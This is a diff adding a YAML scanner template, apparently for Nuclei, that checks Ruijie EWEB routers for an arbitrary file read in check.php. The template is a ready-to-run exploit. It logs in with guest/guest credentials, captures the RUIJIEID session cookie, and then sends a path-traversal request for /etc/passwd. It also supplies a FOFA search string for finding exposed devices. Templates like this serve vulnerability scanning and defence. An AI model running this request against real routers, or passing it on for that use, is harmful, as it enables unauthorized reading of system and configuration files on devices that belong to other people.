@@ -1,0 +1,49 @@
+id: ruijieEWEB-check_php-File-reading
+
+info:
+  name: "锐捷EWEB路由器 check.php 任意文件读取漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: title="锐捷网络-EWEB网管系统"
+    该漏洞允许未经身份验证的攻击者通过 check.php 接口实现任意文件访问，可获取数据库配置文件、系统配置文件等敏感数据，导致系统安全防护体系失效。攻击者可通过构造恶意请求直接读取受限文件内容，形成持续性安全威胁。
+  reference:
+  - https://mp.weixin.qq.com/s/1GaVAZLcHXVRLUPCdPnBVw
+  tags: 锐捷EWEB
+
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /ddi/server/login.php HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
+    Content-Type: application/x-www-form-urlencoded
+
+    username=guest&password=guest?
+  extractors:
+  - type: regex
+    part: header
+    name: RUIJIEID
+    group: 1
+    regex:
+    - 'RUIJIEID=(.*?);'
+    internal: true
+- raw:
+  - |
+    GET /check.php?a=index&url=../../../../../etc/passwd HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
+    Cookie: {{RUIJIEID}}
+
+  matchers-condition: and
+  matchers:
+  - type: regex
+    part: body
+    regex:
+    - 'root:.*:0:0'
+  - type: status
+    status:
+    - 200
